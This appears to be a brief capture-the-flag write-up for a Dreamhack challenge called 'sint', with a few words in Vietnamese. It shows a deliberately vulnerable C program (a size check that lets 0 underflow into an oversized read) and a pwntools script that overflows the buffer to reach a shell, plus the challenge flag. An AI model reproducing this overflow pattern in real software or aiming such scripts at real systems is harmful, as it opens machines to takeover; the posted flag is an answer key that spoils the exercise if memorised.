# sint

source C:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

bài này dễ quá mình chả biết viết sao nên mình gửi script thôi:

## script:

```python
from pwn import *

# p = process('./sint')

p = remote('host3.dreamhack.games', 16218)
exe = ELF('./sint')

payload = b'0'

p.sendlineafter(b'Size: ', payload)

payload = b'a'*260
payload += p64(exe.sym['get_shell'] + 1)

p.sendafter(b'Data: ', payload)

p.interactive()

# DH{d66e84c453b960cfe37780e8ed9d70ab}

```

## Flag:

**DH{d66e84c453b960cfe37780e8ed9d70ab}**
